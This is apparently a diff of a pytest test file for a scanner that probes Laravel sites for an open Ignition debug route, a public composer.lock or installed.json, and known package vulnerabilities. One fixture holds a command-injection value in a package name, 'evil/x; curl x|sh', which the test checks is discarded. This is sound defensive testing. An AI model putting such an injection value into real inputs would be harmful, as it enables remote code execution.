@@ -56,8 +56,10 @@ def _site(monkeypatch, pages, *, cookies=(XSRF, SESSION), cert_days=90, support=
     pages.setdefault(BASE, (200, HOME_HEADERS, HOME, list(cookies)))
     pages.setdefault('http://app.test/', (301, {'Location': BASE}, ''))
 
-    def fetch(url, follow=True):
+    def fetch(url, follow=True, max_body=None):
         requested.append((url, follow))
+        limit = max_body or webprobe.MAX_BODY
+        requested.limits[url] = limit
         start = url
         for _ in range(6):
             hit = pages.get(url)
@@ -73,7 +75,10 @@ def _site(monkeypatch, pages, *, cookies=(XSRF, SESSION), cert_days=90, support=
                     raise webprobe.OffSiteRedirect(f'redirected to another site: {urlparse(target).hostname}')
                 url = target
                 continue
-            return webprobe.Page(status, url, headers, text, list(rest[0]) if rest else [])
+            # the body is cut where the real fetch cuts it
+            page = webprobe.Page(status, url, headers, text[:limit], list(rest[0]) if rest else [])
+            page.truncated = len(text) > limit
+            return page
         raise httpx.TooManyRedirects('loop')
 
     monkeypatch.setattr(laravel, '_fetch', fetch)
@@ -96,6 +101,7 @@ class _Calls(list):
         super().__init__()
         self.support = []
         self.vulns = []
+        self.limits = {}
 
 
 def _ids(result):
@@ -283,12 +289,12 @@ def test_env_without_an_answer_is_not_checked(monkeypatch):
 
 # --- debug tools --------------------------------------------------------------------------------
 
-def test_open_ignition_is_critical(monkeypatch):
+def test_open_ignition_health_check_is_high(monkeypatch):
     _site(monkeypatch, {f'{BASE}_ignition/health-check': (200, {'Content-Type': 'application/json'},
                                                           '{"can_execute_commands":true}')})
     result = laravel.check_laravel_external(BASE)
     f = _by_id(result, 'LV-IGN-001')
-    assert f['severity'] == 'critical'
+    assert f['severity'] == 'high'
     assert _checked(result)['ignition'] == 'problem'
 
 
@@ -535,7 +541,136 @@ def test_the_session_cookie_is_picked_by_its_name_first(monkeypatch):
 
 @pytest.mark.parametrize('value', ['true', 'false'])
 def test_ignition_detail_says_what_it_answered(monkeypatch, value):
+    # review pass 1 (P5): the open route is the fact; that a solution runs was not tried (GET only)
     _site(monkeypatch, {f'{BASE}_ignition/health-check': (200, {}, f'{{"can_execute_commands":{value}}}')})
     f = _by_id(laravel.check_laravel_external(BASE), 'LV-IGN-001')
-    assert f['severity'] == 'critical'
+    assert f['severity'] == 'high'
     assert f'can_execute_commands: {value}' in f['detail']
+    assert 'not tried' in f['detail']
+    assert 'CVE-2021-3129' not in f['detail'] + f['title'] + f['recommendation']
+
+
+@pytest.mark.parametrize('body', ['{"can_execute_commands":"yes"}', '{"can_execute_commands":null}',
+                                  '{"can_execute_commands":1}'])
+def test_an_unexpected_ignition_answer_is_not_checked(monkeypatch, body):
+    _site(monkeypatch, {f'{BASE}_ignition/health-check': (200, {}, body)})
+    result = laravel.check_laravel_external(BASE)
+    assert 'LV-IGN-001' not in _ids(result)
+    assert _checked(result)['ignition'] == 'not_checked'
+    assert 'unexpected' in _detail(result, 'ignition')
+
+
+# --- review pass 1: commands, incomplete inventories, lock vs installed, fixes -------------------------
+
+def _vulns_for(packages, found=None, unanswered=()):
+    found = found or {}
+    return {'status': 'ok', 'matches': {p['name']: found.get(p['name'], []) for p in packages
+                                        if p['name'] not in unanswered},
+            'unanswered': list(unanswered), 'error': None, 'checked': len(packages) - len(unanswered)}
+
+
+def test_no_shell_command_is_built_from_the_site(monkeypatch):
+    # P1: a recommendation is words, never a command for the operator to paste
+    vulns = {'status': 'ok', 'matches': {'laravel/framework': [GHSA], 'guzzlehttp/guzzle': [], 'phpunit/phpunit': []},
+             'unanswered': [], 'error': None, 'checked': 3}
+    _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, LOCK)}, vulns=vulns)
+    result = laravel.check_laravel_external(BASE)
+    for f in result['findings']:
+        assert 'composer update' not in (f.get('recommendation') or ''), f
+        assert 'composer require' not in (f.get('recommendation') or ''), f
+
+
+def test_a_lock_entry_in_another_format_is_not_asked_about_and_is_a_gap(monkeypatch):
+    lock = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v12.3.0'},
+                                    {'name': 'evil/x; curl x|sh', 'version': '1.0.0'}]})
+    vulns = {'status': 'ok', 'matches': {'laravel/framework': []}, 'unanswered': [], 'error': None, 'checked': 1}
+    requested = _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock)}, vulns=vulns)
+    result = laravel.check_laravel_external(BASE)
+    assert requested.vulns == [[{'name': 'laravel/framework', 'version': '12.3.0'}]]
+    assert 'curl' not in json.dumps(result)
+    # P2: one package checked of two is not "none known"
+    assert _checked(result)['vulns'] == 'not_checked'
+    assert '1 entry' in _detail(result, 'vulns')
+
+
+def test_an_unreadable_entry_stays_a_gap_next_to_a_finding(monkeypatch):
+    lock = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v11.0.0'}, {'name': 'a/b'}]})
+    vulns = {'status': 'ok', 'matches': {'laravel/framework': [GHSA]}, 'unanswered': [], 'error': None, 'checked': 1}
+    _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock)}, vulns=vulns)
+    checked = _checked(laravel.check_laravel_external(BASE))
+    assert checked['vulns'] == 'problem'
+    assert checked['vuln_gaps'] == 'not_checked'
+
+
+def test_a_lock_bigger_than_a_page_is_still_read(monkeypatch):
+    # P2: a real composer.lock is often larger than the 256 KB a page is cut at
+    packages = [{'name': 'laravel/framework', 'version': 'v12.3.0', 'description': 'x' * 500}]
+    packages += [{'name': f'vendor/package{i}', 'version': '1.0.0', 'description': 'x' * 500} for i in range(700)]
+    lock = json.dumps({'_readme': ['x'], 'content-hash': 'abc', 'packages': packages})
+    assert len(lock) > webprobe.MAX_BODY
+    requested = _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock)})
+    result = laravel.check_laravel_external(BASE)
+    assert requested.limits[f'{BASE}composer.lock'] == laravel.INVENTORY_MAX_BODY
+    assert len(requested.vulns[0]) == 701
+    assert result['framework']['version'] == '12.3.0'
+
+
+def test_a_lock_too_big_to_read_is_public_but_not_checked(monkeypatch):
+    monkeypatch.setattr(laravel, 'INVENTORY_MAX_BODY', 2000)
+    packages = [{'name': f'vendor/package{i}', 'version': '1.0.0'} for i in range(200)]
+    lock = json.dumps({'_readme': ['x'], 'content-hash': 'abc', 'packages': packages}, indent=4)
+    requested = _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock)})
+    result = laravel.check_laravel_external(BASE)
+    assert 'LV-FILE-002' in _ids(result)
+    checked = _checked(result)
+    assert checked['laravel_version'] == checked['vulns'] == 'not_checked'
+    assert 'too large' in _detail(result, 'vulns')
+    assert requested.vulns == []
+
+
+def test_installed_versions_win_over_a_lock_that_disagrees(monkeypatch):
+    # P3: the lock names what was locked, installed.json what is installed
+    lock = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v12.0.0'}]})
+    installed = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v11.0.0'}]})
+    requested = _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock),
+                                    f'{BASE}vendor/composer/installed.json': (200, {}, installed)})
+    result = laravel.check_laravel_external(BASE)
+    assert requested.support == ['11.0.0']
+    assert requested.vulns == [[{'name': 'laravel/framework', 'version': '11.0.0'}]]
+    assert result['framework']['source'] == 'vendor/composer/installed.json'
+    assert _checked(result)['version_sources'] == 'not_checked'
+    detail = _detail(result, 'version_sources')
+    assert 'laravel/framework' in detail and '12.0.0' in detail and '11.0.0' in detail
+
+
+def test_a_lock_and_installed_json_that_agree(monkeypatch):
+    lock = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v12.3.0'}]})
+    _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock), f'{BASE}vendor/composer/installed.json': (200, {}, lock)})
+    assert _checked(laravel.check_laravel_external(BASE))['version_sources'] == 'ok'
+
+
+def test_a_lock_alone_says_its_versions_are_locked_ones(monkeypatch):
+    lock = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v12.3.0'}]})
+    _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock)})
+    result = laravel.check_laravel_external(BASE)
+    assert 'locked' in _detail(result, 'laravel_version')
+    assert 'version_sources' not in _checked(result)
+
+
+def test_no_fix_for_this_version_says_so(monkeypatch):
+    # P4: without the fix of this version's range, the advisory is the way on
+    open_ = {**GHSA, 'fixed': []}
+    vulns = {'status': 'ok', 'matches': {'laravel/framework': [open_]}, 'unanswered': [], 'error': None, 'checked': 1}
+    lock = json.dumps({'packages': [{'name': 'laravel/framework', 'version': 'v11.0.0'}]})
+    _site(monkeypatch, {f'{BASE}composer.lock': (200, {}, lock)}, vulns=vulns)
+    f = _by_id(laravel.check_laravel_external(BASE), subject_id('LV-VULN-001', 'laravel/framework', GHSA['id']))
+    assert 'no fixed release named for this version' in f['detail']
+    assert 'Update' not in f['recommendation']
+    assert f['link'] == GHSA['link']
+
+
+def test_fetch_marks_a_cut_body(monkeypatch):
+    monkeypatch.setattr(laravel, '_TRANSPORT', httpx.MockTransport(lambda request: httpx.Response(200, text='x' * 50)))
+    assert laravel._fetch(BASE, max_body=10).truncated is True
+    assert len(laravel._fetch(BASE, max_body=10).text) == 10
+    assert laravel._fetch(BASE, max_body=50).truncated is False
